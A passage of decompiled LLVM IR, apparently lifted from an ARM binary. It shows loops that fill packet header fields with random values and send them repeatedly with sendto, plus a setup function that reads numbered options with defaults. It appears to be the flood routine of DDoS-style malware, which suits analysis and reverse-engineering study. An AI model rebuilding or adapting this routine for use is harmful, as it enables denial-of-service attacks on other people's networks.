  %v4_9c78 = sdiv i32 %v2_9c74, 256
  store i32 %v4_9c78, i32* %r3.global-to-local, align 4
  %v1_9c7c = trunc i32 %v4_9c78 to i8
  %v2_9c7c = load i32, i32* @r5, align 4
  %v3_9c7c = add i32 %v2_9c7c, 11
  %v4_9c7c = inttoptr i32 %v3_9c7c to i8*
  store i8 %v1_9c7c, i8* %v4_9c7c, align 1
  %v3_9c80 = load i32, i32* @r5, align 4
  %v4_9c80 = add i32 %v3_9c80, 10
  %v5_9c80 = inttoptr i32 %v4_9c80 to i8*
  store i8 %v3_9c74, i8* %v5_9c80, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_9c88 = load i32, i32* @sl, align 4
  %v1_9c88 = trunc i32 %v0_9c88 to i8
  %v2_9c88 = load i32, i32* @r6, align 4
  %v3_9c88 = add i32 %v2_9c88, 10
  %v4_9c88 = inttoptr i32 %v3_9c88 to i8*
  store i8 %v1_9c88, i8* %v4_9c88, align 1
  %v0_9c8c = load i32, i32* @sl, align 4
  %v1_9c8c = trunc i32 %v0_9c8c to i8
  %v2_9c8c = load i32, i32* @r6, align 4
  %v3_9c8c = add i32 %v2_9c8c, 11
  %v4_9c8c = inttoptr i32 %v3_9c8c to i8*
  store i8 %v1_9c8c, i8* %v4_9c8c, align 1
  %v0_9c90 = load i32, i32* @r6, align 4
  store i32 %v0_9c90, i32* @r0, align 4
  %v2_9c94 = call i32 @function_de24(i32 %v0_9c90, i32 20)
  %v3_9c94 = trunc i32 %v2_9c94 to i8
  store i32 %v2_9c94, i32* %r0.global-to-local, align 4
  %v4_9c98 = sdiv i32 %v2_9c94, 256
  store i32 %v4_9c98, i32* %r3.global-to-local, align 4
  %v3_9c9c = load i32, i32* @r6, align 4
  %v4_9c9c = add i32 %v3_9c9c, 10
  %v5_9c9c = inttoptr i32 %v4_9c9c to i8*
  store i8 %v3_9c94, i8* %v5_9c9c, align 1
  %v0_9ca0 = load i32, i32* %r3.global-to-local, align 4
  %v1_9ca0 = trunc i32 %v0_9ca0 to i8
  %v2_9ca0 = load i32, i32* @r6, align 4
  %v3_9ca0 = add i32 %v2_9ca0, 11
  %v4_9ca0 = inttoptr i32 %v3_9ca0 to i8*
  store i8 %v1_9ca0, i8* %v4_9ca0, align 1
  %v0_9ca4 = load i32, i32* @r7, align 4
  %v1_9ca4 = add i32 %v0_9ca4, 4
  %v2_9ca4 = inttoptr i32 %v1_9ca4 to i8*
  %v3_9ca4 = load i8, i8* %v2_9ca4, align 1
  %v4_9ca4 = zext i8 %v3_9ca4 to i32
  store i32 %v4_9ca4, i32* %r3.global-to-local, align 4
  %v1_9ca8 = add i32 %v0_9ca4, 5
  %v2_9ca8 = inttoptr i32 %v1_9ca8 to i8*
  %v3_9ca8 = load i8, i8* %v2_9ca8, align 1
  %v4_9ca8 = zext i8 %v3_9ca8 to i32
  store i32 %v0_9ca4, i32* @r1, align 4
  %v4_9cb0 = mul nuw nsw i32 %v4_9ca8, 256
  %v5_9cb0 = or i32 %v4_9cb0, %v4_9ca4
  store i32 %v5_9cb0, i32* %r2.global-to-local, align 4
  %v0_9cb4 = load i32, i32* @sl, align 4
  %v1_9cb4 = trunc i32 %v0_9cb4 to i8
  %v3_9cb4 = add i32 %v0_9ca4, 6
  %v4_9cb4 = inttoptr i32 %v3_9cb4 to i8*
  store i8 %v1_9cb4, i8* %v4_9cb4, align 1
  store i32 %stack_var_-156.0.ph, i32* %r3.global-to-local, align 4
  %v0_9cbc = load i32, i32* @sl, align 4
  %v1_9cbc = trunc i32 %v0_9cbc to i8
  %v2_9cbc = load i32, i32* @r7, align 4
  %v3_9cbc = add i32 %v2_9cbc, 7
  %v4_9cbc = inttoptr i32 %v3_9cbc to i8*
  store i8 %v1_9cbc, i8* %v4_9cbc, align 1
  %v0_9cc0 = load i32, i32* @r6, align 4
  store i32 %v0_9cc0, i32* %r0.global-to-local, align 4
  %v4_9cc4 = call i32 @function_de80(i32 %v0_9cc0, i32 %v0_9ca4, i32 %v5_9cb0, i32 %stack_var_-156.0.ph)
  %v5_9cc4 = trunc i32 %v4_9cc4 to i8
  store i32 %v4_9cc4, i32* %r0.global-to-local, align 4
  %v3_9cc8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_9cc8, i32* %r3.global-to-local, align 4
  %v3_9ccc = mul i32 %v3_9cc8, 32
  store i32 %v3_9ccc, i32* %r2.global-to-local, align 4
  %v0_9cd0 = load i32, i32* @r5, align 4
  %v1_9cd0 = add i32 %v0_9cd0, 16
  %v2_9cd0 = inttoptr i32 %v1_9cd0 to i32*
  %v3_9cd0 = load i32, i32* %v2_9cd0, align 4
  store i32 %v3_9cd0, i32* %r1.global-to-local, align 4
  %v5_9cd4 = mul i32 %v3_9cc8, 24
  store i32 %v5_9cd4, i32* %r2.global-to-local, align 4
  %v4_9cd840 = udiv i32 %v4_9cc4, 256
  %v1_9cdc = trunc i32 %v4_9cd840 to i8
  %v2_9cdc = load i32, i32* @r7, align 4
  %v3_9cdc = add i32 %v2_9cdc, 7
  %v4_9cdc = inttoptr i32 %v3_9cdc to i8*
  store i8 %v1_9cdc, i8* %v4_9cdc, align 1
  %v0_9ce0 = load i32, i32* %r2.global-to-local, align 4
  %v1_9ce0 = load i32, i32* @sb, align 4
  %v2_9ce0 = add i32 %v1_9ce0, %v0_9ce0
  store i32 %v2_9ce0, i32* %lr.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v3_9ce8 = load i32, i32* @r7, align 4
  %v4_9ce8 = add i32 %v3_9ce8, 6
  %v5_9ce8 = inttoptr i32 %v4_9ce8 to i8*
  store i8 %v5_9cc4, i8* %v5_9ce8, align 1
  %v0_9cec = load i32, i32* %r1.global-to-local, align 4
  %v1_9cec = load i32, i32* %lr.global-to-local, align 4
  %v2_9cec = add i32 %v1_9cec, 4
  %v3_9cec = inttoptr i32 %v2_9cec to i32*
  store i32 %v0_9cec, i32* %v3_9cec, align 4
  %v0_9cf0 = load i32, i32* %r3.global-to-local, align 4
  %v1_9cf0 = trunc i32 %v0_9cf0 to i8
  %v2_9cf0 = load i32, i32* %r2.global-to-local, align 4
  %v3_9cf0 = load i32, i32* @sb, align 4
  %v4_9cf0 = add i32 %v3_9cf0, %v2_9cf0
  %v5_9cf0 = inttoptr i32 %v4_9cf0 to i8*
  store i8 %v1_9cf0, i8* %v5_9cf0, align 1
  %v0_9cf4 = load i32, i32* @sl, align 4
  %v1_9cf4 = trunc i32 %v0_9cf4 to i8
  %v2_9cf4 = load i32, i32* %lr.global-to-local, align 4
  %v3_9cf4 = add i32 %v2_9cf4, 2
  %v4_9cf4 = inttoptr i32 %v3_9cf4 to i8*
  store i8 %v1_9cf4, i8* %v4_9cf4, align 1
  %v0_9cf8 = load i32, i32* @sl, align 4
  %v1_9cf8 = trunc i32 %v0_9cf8 to i8
  %v2_9cf8 = load i32, i32* %lr.global-to-local, align 4
  %v3_9cf8 = add i32 %v2_9cf8, 1
  %v4_9cf8 = inttoptr i32 %v3_9cf8 to i8*
  store i8 %v1_9cf8, i8* %v4_9cf8, align 1
  %v0_9cfc = load i32, i32* @sl, align 4
  %v1_9cfc = trunc i32 %v0_9cfc to i8
  %v2_9cfc = load i32, i32* %lr.global-to-local, align 4
  %v3_9cfc = add i32 %v2_9cfc, 3
  %v4_9cfc = inttoptr i32 %v3_9cfc to i8*
  store i8 %v1_9cfc, i8* %v4_9cfc, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_9d08 = load i32, i32* @r5, align 4
  store i32 %v0_9d08, i32* %r1.global-to-local, align 4
  store i32 %v3_9858, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-160.0.ph, i32* %r2.global-to-local, align 4
  %v0_9d14 = load i32, i32* %lr.global-to-local, align 4
  %v4_9d14 = inttoptr i32 %v0_9d14 to %sockaddr*
  %v7_9d1c = inttoptr i32 %v0_9d08 to i32*
  %v9_9d1c = call i32 @sendto(i32 %v3_9858, i32* %v7_9d1c, i32 %stack_var_-160.0.ph, i32 16384, %sockaddr* %v4_9d14, i32 16)
  %v3_9d20 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_9d20, i32* %r3.global-to-local, align 4
  %v1_9d24 = add i32 %v3_9d20, 1
  store i32 %v1_9d24, i32* %r0.global-to-local, align 4
  %v1_9d28 = load i32, i32* @fp, align 4
  %v9_9d28 = icmp eq i32 %v1_9d24, %v1_9d28
  store i1 %v9_9d28, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9d24, i32* %stack_var_-40, align 4
  %v6_9d30 = icmp slt i32 %v1_9d24, %v1_9d28
  br i1 %v6_9d30, label %dec_label_pc_9b88, label %dec_label_pc_9b70

dec_label_pc_9d38:                                ; preds = %dec_label_pc_9868
  store i32 %v3_9858, i32* %r0.global-to-local, align 4
  %v1_9d3c = call i32 @close(i32 %v3_9858)
  store i32 %v1_9d3c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9d40

dec_label_pc_9d40:                                ; preds = %dec_label_pc_9704, %dec_label_pc_9d38
  %v29_9d44 = phi i32 [ -1, %dec_label_pc_9704 ], [ %v1_9d3c, %dec_label_pc_9d38 ]
  store i32 %v3_9704, i32* %r4.global-to-local, align 4
  store i32 %v6_9704, i32* %r5.global-to-local, align 4
  store i32 %v9_9704, i32* %r6.global-to-local, align 4
  store i32 %v12_9704, i32* %r7.global-to-local, align 4
  store i32 %v15_9704, i32* %r8.global-to-local, align 4
  store i32 %v21_9704, i32* %sl.global-to-local, align 4
  ret i32 %v29_9d44

dec_label_pc_9d48:                                ; preds = %dec_label_pc_9b88
  %v1_9d48 = add i32 %v2_9b90, 16
  %v2_9d48 = inttoptr i32 %v1_9d48 to i32*
  %v3_9d48 = load i32, i32* %v2_9d48, align 4
  store i32 %v3_9d48, i32* %r4.global-to-local, align 4
  %v0_9d4c = call i32 @function_f6c4()
  store i32 %v0_9d4c, i32* %r0.global-to-local, align 4
  %v3_9d50 = load i32, i32* %stack_var_-40, align 4
  %v5_9d58 = mul i32 %v3_9d50, 24
  %v0_9d5c = load i32, i32* %r4.global-to-local, align 4
  %v1_9d60 = load i32, i32* @sb, align 4
  %v2_9d60 = add i32 %v1_9d60, %v5_9d58
  store i32 %v2_9d60, i32* %r1.global-to-local, align 4
  %v1_9d64 = and i32 %v0_9d5c, 65280
  store i32 %v1_9d64, i32* %r3.global-to-local, align 4
  %v1_9d5c = udiv i32 %v0_9d5c, 256
  %v3_9d68 = and i32 %v1_9d5c, 65280
  store i32 %v3_9d68, i32* %r2.global-to-local, align 4
  %v3_9d6c = mul i32 %v0_9d5c, 16777216
  store i32 %v3_9d6c, i32* %ip.global-to-local, align 4
  %v1_9d70 = add i32 %v2_9d60, 20
  %v2_9d70 = inttoptr i32 %v1_9d70 to i8*
  %v3_9d70 = load i8, i8* %v2_9d70, align 1
  %v4_9d70 = zext i8 %v3_9d70 to i32
  store i32 %v4_9d70, i32* %lr.global-to-local, align 4
  %v4_9d74 = mul nuw nsw i32 %v1_9d64, 256
  %v5_9d74 = or i32 %v4_9d74, %v3_9d6c
  store i32 %v5_9d74, i32* %ip.global-to-local, align 4
  %v2_9d7c = call i32 @llvm.bswap.i32(i32 %v0_9d5c)
  %v7_9d80 = lshr i32 %v0_9d4c, %v4_9d70
  %v8_9d80 = add i32 %v7_9d80, %v2_9d7c
  %v3_9d8c = mul i32 %v8_9d80, 16777216
  %v1_9d90 = and i32 %v8_9d80, 65280
  store i32 %v1_9d90, i32* %r0.global-to-local, align 4
  store i32 %v6_9844, i32* %r2.global-to-local, align 4
  %v4_9d9c = mul nuw nsw i32 %v1_9d90, 256
  %v5_9d9c = or i32 %v4_9d9c, %v3_9d8c
  store i32 %v5_9d9c, i32* %r1.global-to-local, align 4
  %v2_9da0 = call i32 @llvm.bswap.i32(i32 %v8_9d80)
  store i32 %v2_9da0, i32* %r3.global-to-local, align 4
  store i1 %v2_9bb8, i1* %cpsr_z.global-to-local, align 1
  %v1_9da8 = load i32, i32* @r5, align 4
  %v2_9da8 = add i32 %v1_9da8, 16
  %v3_9da8 = inttoptr i32 %v2_9da8 to i32*
  store i32 %v2_9da0, i32* %v3_9da8, align 4
  br i1 %v2_9bb8, label %dec_label_pc_9db0, label %dec_label_pc_9bc0

dec_label_pc_9db0:                                ; preds = %dec_label_pc_9d48, %dec_label_pc_9bb4
  %v0_9db0 = call i32 @function_f6c4()
  store i32 %v0_9db0, i32* %r0.global-to-local, align 4
  store i32 %v3_98a8, i32* %r3.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_9dc0, i1* %cpsr_z.global-to-local, align 1
  %v1_9dc4 = load i32, i32* @r5, align 4
  %v2_9dc4 = add i32 %v1_9dc4, 12
  %v3_9dc4 = inttoptr i32 %v2_9dc4 to i32*
  store i32 %v0_9db0, i32* %v3_9dc4, align 4
  br i1 %v3_9dc0, label %dec_label_pc_9dcc, label %dec_label_pc_9db0.dec_label_pc_9bd4_crit_edge

dec_label_pc_9db0.dec_label_pc_9bd4_crit_edge:    ; preds = %dec_label_pc_9db0
  %v1_9bd8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_9bd4

dec_label_pc_9dcc:                                ; preds = %dec_label_pc_9db0, %dec_label_pc_9bc0
  %v0_9dcc = call i32 @function_f6c4()
  %v3_9dd4 = urem i32 %v0_9dcc, 65536
  store i32 %v3_9dd4, i32* %r0.global-to-local, align 4
  %v1_9ddc = sub nsw i32 999, %v3_9dd4
  store i32 %v1_9ddc, i32* %r2.global-to-local, align 4
  %v3_9de0 = sdiv i32 %v1_9ddc, 256
  store i32 %v3_9de0, i32* %r1.global-to-local, align 4
  %v3_9de439 = udiv i32 %v3_9dd4, 256
  store i32 %v3_9de439, i32* %r3.global-to-local, align 4
  %v1_9de8 = trunc i32 %v3_9de439 to i8
  %v2_9de8 = load i32, i32* @r5, align 4
  %v3_9de8 = add i32 %v2_9de8, 5
  %v4_9de8 = inttoptr i32 %v3_9de8 to i8*
  store i8 %v1_9de8, i8* %v4_9de8, align 1
  %v0_9dec = load i32, i32* %r0.global-to-local, align 4
  %v1_9dec = trunc i32 %v0_9dec to i8
  %v2_9dec = load i32, i32* @r5, align 4
  %v3_9dec = add i32 %v2_9dec, 4
  %v4_9dec = inttoptr i32 %v3_9dec to i8*
  store i8 %v1_9dec, i8* %v4_9dec, align 1
  %v0_9df0 = load i32, i32* %r1.global-to-local, align 4
  %v1_9df0 = trunc i32 %v0_9df0 to i8
  %v2_9df0 = load i32, i32* @r6, align 4
  %v3_9df0 = add i32 %v2_9df0, 5
  %v4_9df0 = inttoptr i32 %v3_9df0 to i8*
  store i8 %v1_9df0, i8* %v4_9df0, align 1
  store i32 %v3_98ac, i32* %r1.global-to-local, align 4
  %v1_9df8 = load i32, i32* @r4, align 4
  %v9_9df8 = icmp eq i32 %v3_98ac, %v1_9df8
  store i1 %v9_9df8, i1* %cpsr_z.global-to-local, align 1
  %v0_9dfc = load i32, i32* %r2.global-to-local, align 4
  %v1_9dfc = trunc i32 %v0_9dfc to i8
  %v2_9dfc = load i32, i32* @r6, align 4
  %v3_9dfc = add i32 %v2_9dfc, 4
  %v4_9dfc = inttoptr i32 %v3_9dfc to i8*
  store i8 %v1_9dfc, i8* %v4_9dfc, align 1
  %v0_9e00 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9e00, label %dec_label_pc_9e04, label %dec_label_pc_9dcc.dec_label_pc_9be0_crit_edge

dec_label_pc_9dcc.dec_label_pc_9be0_crit_edge:    ; preds = %dec_label_pc_9dcc
  %v1_9be4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_9be0

dec_label_pc_9e04:                                ; preds = %dec_label_pc_9dcc, %dec_label_pc_9bd4
  %v0_9e04 = call i32 @function_f6c4()
  %v1_9e04 = trunc i32 %v0_9e04 to i8
  store i32 %v0_9e04, i32* %r0.global-to-local, align 4
  store i32 %v3_98b0, i32* %r2.global-to-local, align 4
  %v4_9e0c = sdiv i32 %v0_9e04, 256
  store i32 %v4_9e0c, i32* %r3.global-to-local, align 4
  %v1_9e10 = load i32, i32* @r4, align 4
  %v9_9e10 = icmp eq i32 %v3_98b0, %v1_9e10
  store i1 %v9_9e10, i1* %cpsr_z.global-to-local, align 1
  %v3_9e14 = load i32, i32* @r5, align 4
  %v4_9e14 = add i32 %v3_9e14, 58
  %v5_9e14 = inttoptr i32 %v4_9e14 to i8*
  store i8 %v1_9e04, i8* %v5_9e14, align 1
  %v0_9e18 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e18 = trunc i32 %v0_9e18 to i8
  %v2_9e18 = load i32, i32* @r7, align 4
  %v3_9e18 = add i32 %v2_9e18, 1
  %v4_9e18 = inttoptr i32 %v3_9e18 to i8*
  store i8 %v1_9e18, i8* %v4_9e18, align 1
  %v0_9e1c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9e1c, label %dec_label_pc_9e20, label %dec_label_pc_9bec

dec_label_pc_9e20:                                ; preds = %dec_label_pc_9e04, %dec_label_pc_9be0
  %v0_9e20 = call i32 @function_f6c4()
  %v1_9e20 = trunc i32 %v0_9e20 to i8
  store i32 %v0_9e20, i32* %r0.global-to-local, align 4
  %v4_9e2441 = udiv i32 %v0_9e20, 256
  %v1_9e28 = trunc i32 %v4_9e2441 to i8
  %v2_9e28 = load i32, i32* @r7, align 4
  %v3_9e28 = add i32 %v2_9e28, 3
  %v4_9e28 = inttoptr i32 %v3_9e28 to i8*
  store i8 %v1_9e28, i8* %v4_9e28, align 1
  store i32 %v1_98a0, i32* %r3.global-to-local, align 4
  store i1 %v2_9e30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9e30, label %bb101, label %bb100

bb100:                                            ; preds = %dec_label_pc_9e20
  %v1_9e34 = load i32, i32* @r5, align 4
  %v2_9e34 = add i32 %v1_9e34, 16
  %v3_9e34 = inttoptr i32 %v2_9e34 to i32*
  %v4_9e34 = load i32, i32* %v3_9e34, align 4
  store i32 %v4_9e34, i32* %r3.global-to-local, align 4
  br label %bb101

bb101:                                            ; preds = %dec_label_pc_9e20, %bb100
  %v3_9e38 = load i32, i32* @r7, align 4
  %v4_9e38 = add i32 %v3_9e38, 2
  %v5_9e38 = inttoptr i32 %v4_9e38 to i8*
  store i8 %v1_9e20, i8* %v5_9e38, align 1
  %v0_9e3c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9e3c, label %dec_label_pc_9e44, label %bb102

bb102:                                            ; preds = %bb101
  %v1_9e3c = load i32, i32* %r3.global-to-local, align 4
  %v2_9e3c = load i32, i32* @r6, align 4
  %v3_9e3c = add i32 %v2_9e3c, 16
  %v4_9e3c = inttoptr i32 %v3_9e3c to i32*
  store i32 %v1_9e3c, i32* %v4_9e3c, align 4
  br label %dec_label_pc_9c00

dec_label_pc_9e44:                                ; preds = %dec_label_pc_9bec, %bb101
  %v0_9e44 = call i32 @function_f6c4()
  store i32 %v0_9e44, i32* %r0.global-to-local, align 4
  %v1_9e48 = load i32, i32* @r6, align 4
  %v2_9e48 = add i32 %v1_9e48, 16
  %v3_9e48 = inttoptr i32 %v2_9e48 to i32*
  store i32 %v0_9e44, i32* %v3_9e48, align 4
  br label %dec_label_pc_9c00

dec_label_pc_9e50:                                ; preds = %dec_label_pc_9c00
  %v0_9e50 = load i32, i32* @r7, align 4
  %v1_9e50 = add i32 %v0_9e50, 8
  store i32 %v1_9e50, i32* %r0.global-to-local, align 4
  store i32 %v6_97f0, i32* @r1, align 4
  %v1_9e58 = inttoptr i32 %v1_9e50 to i8*
  %v2_9e58 = call i32 @function_f844(i8* %v1_9e58)
  store i32 %v2_9e58, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9c64

dec_label_pc_9e60:                                ; preds = %dec_label_pc_9890
  %v1_9e68 = add i32 %v6_97f0, 8
  store i32 %v1_9e68, i32* %r1.global-to-local, align 4
  %v1_9e6c = add i32 %v6_97f0, 66
  store i32 %v1_9e6c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_9b70.preheader

; uselistorder directives
  uselistorder i32 %v1_9e6c, { 1, 0 }
  uselistorder i32 %v1_9e68, { 1, 0 }
  uselistorder i32 %v0_9e20, { 0, 2, 1 }
  uselistorder i32 %v0_9e04, { 0, 2, 1 }
  uselistorder i32 %v3_9dd4, { 0, 2, 1 }
  uselistorder i32 %v2_9da0, { 1, 0 }
  uselistorder i32 %v8_9d80, { 1, 2, 0 }
  uselistorder i32 %v3_9d6c, { 1, 0 }
  uselistorder i32 %v0_9d5c, { 2, 0, 1, 3 }
  uselistorder i32 %v1_9d28, { 1, 2, 0 }
  uselistorder i32 %v1_9d24, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_9cc8, { 1, 0, 2 }
  uselistorder i32 %v4_9cc4, { 0, 2, 1 }
  uselistorder i32 %v0_9ca4, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_9c94, { 0, 2, 1 }
  uselistorder i32 %v4_9c78, { 1, 0 }
  uselistorder i32 %v7_9b9c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_9b70, { 1, 0 }
  uselistorder i1 %v2_9bb8, { 3, 0, 1, 2 }
  uselistorder i1 %v2_9e30, { 2, 3, 1, 0 }
  uselistorder i1 %v3_9dc0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_9af8, { 1, 0, 2 }
  uselistorder i32 %v3_9960, { 1, 0 }
  uselistorder i32 %tmp89, { 1, 0 }
  uselistorder i32 %v1_9904, { 1, 0 }
  uselistorder i32 %v1_9900, { 2, 1, 0 }
  uselistorder i32 %v1_98ec, { 1, 0 }
  uselistorder i32 %v1_98e8, { 2, 1, 0 }
  uselistorder i32 %v1_98e0, { 0, 2, 1 }
  uselistorder i32 %v3_98d8, { 2, 1, 0 }
  uselistorder i32 %v0_98b4, { 1, 0, 2 }
  uselistorder i32 %v3_98a8, { 2, 1, 3, 0 }
  uselistorder i32 %v1_98a0, { 4, 3, 5, 1, 2, 0 }
  uselistorder i32 %v3_989c, { 2, 0, 1 }
  uselistorder i32 %v0_989c, { 2, 1, 0 }
  uselistorder i32 %v0_9894, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_9890, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_9858, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32 %v6_9844, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v1_9810, { 1, 2, 3, 0 }
  uselistorder i32 %v6_97f0, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_97a4, { 1, 2, 0 }
  uselistorder i32 %v6_9778, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v6_973c, { 1, 2, 0 }
  uselistorder i32 %v4_9724, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_9708, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 12, 11 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 57, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 58, 59, 60, 61, 56, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 43, 44, 45, 46, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 40, 39, 41, 47, 48, 49, 50, 42, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 38, 37, 39, 40, 41, 42, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 44, 43, 45, 46, 48, 47, 36, 35, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 8, 9, 6, 7, 11, 10, 12, 15, 13, 14, 16, 2, 17, 18, 38, 37, 39, 40, 41, 1, 20, 19, 24, 21, 22, 23, 27, 25, 26, 28, 30, 29, 31, 32, 33, 34, 35, 42, 43, 44, 45, 46, 36, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 27, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 21, 18, 22, 23, 24, 25, 26 }
  uselistorder label %dec_label_pc_9e44, { 1, 0 }
  uselistorder label %bb101, { 1, 0 }
  uselistorder label %dec_label_pc_9d40, { 1, 0 }
  uselistorder label %dec_label_pc_9c64, { 1, 0 }
  uselistorder label %dec_label_pc_9c00, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9b70.preheader, { 1, 0 }
  uselistorder label %bb98, { 1, 0 }
  uselistorder label %bb97, { 1, 0 }
  uselistorder label %bb95, { 1, 0 }
  uselistorder label %bb93, { 1, 0 }
  uselistorder label %.thread22, { 2, 1, 0 }
}

define i32 @function_9e80(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9e80:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_9e80 = load i32, i32* @r4, align 4
  %v6_9e80 = load i32, i32* @r5, align 4
  %v9_9e80 = load i32, i32* @r6, align 4
  %v12_9e80 = load i32, i32* @r7, align 4
  %v15_9e80 = load i32, i32* @r8, align 4
  %v1_9e84 = urem i32 %arg1, 256
  store i32 %v1_9e84, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 %v1_9e84, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_9e9c = urem i32 %arg3, 256
  store i32 %v1_9e9c, i32* @r4, align 4
  %v2_9ea0 = call i32* @calloc(i32 %v1_9e84, i32 4)
  %v4_9ea0 = ptrtoint i32* %v2_9ea0 to i32
  %v0_9ea4 = load i32, i32* @r5, align 4
  store i32 %v0_9ea4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9eb4 = load i32, i32* @r4, align 4
  store i32 %v0_9eb4, i32* %r0.global-to-local, align 4
  %v5_9eb8 = inttoptr i32 %v0_9ea4 to i32*
  %v6_9eb8 = call i32 @function_930c(i32 %v0_9eb4, i32* %v5_9eb8, i32 2, i32 0, i32 %v4_9ea0)
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_9ed0 = load i32, i32* @r5, align 4
  store i32 %v0_9ed0, i32* %r1.global-to-local, align 4
  %v0_9ed4 = load i32, i32* @r4, align 4
  store i32 %v0_9ed4, i32* %r0.global-to-local, align 4
  %v5_9ed8 = trunc i32 %v6_9eb8 to i8
  %v6_9edc = inttoptr i32 %v0_9ed0 to i32*
  %v7_9edc = call i32 @function_930c(i32 %v0_9ed4, i32* %v6_9edc, i32 3, i32 65535, i32 %v6_9eb8)
  %v0_9ee0 = load i32, i32* @r5, align 4
  store i32 %v0_9ee0, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_9edc, i32* @r7, align 4
  %v0_9ef0 = load i32, i32* @r4, align 4
  store i32 %v0_9ef0, i32* %r0.global-to-local, align 4
  %v5_9ef4 = inttoptr i32 %v0_9ee0 to i32*
  %v6_9ef4 = call i32 @function_930c(i32 %v0_9ef0, i32* %v5_9ef4, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v0_9f00 = load i32, i32* @r5, align 4
  store i32 %v0_9f00, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9f0c = load i32, i32* @r4, align 4
  store i32 %v0_9f0c, i32* %r0.global-to-local, align 4
  %v5_9f10 = trunc i32 %v6_9ef4 to i8
  %v6_9f14 = inttoptr i32 %v0_9f00 to i32*
  %v7_9f14 = call i32 @function_930c(i32 %v0_9f0c, i32* %v6_9f14, i32 5, i32 1, i32 %v6_9ef4)
  %v1_9f20 = urem i32 %v7_9f14, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_9f2c = load i32, i32* @r5, align 4
  store i32 %v0_9f2c, i32* %r1.global-to-local, align 4
  %v0_9f30 = load i32, i32* @r4, align 4
  store i32 %v0_9f30, i32* %r0.global-to-local, align 4
  %v5_9f38 = inttoptr i32 %v0_9f2c to i32*
  %v6_9f38 = call i32 @function_930c(i32 %v0_9f30, i32* %v5_9f38, i32 6, i32 65535, i32 %v1_9f20)
  %v0_9f40 = load i32, i32* @r5, align 4
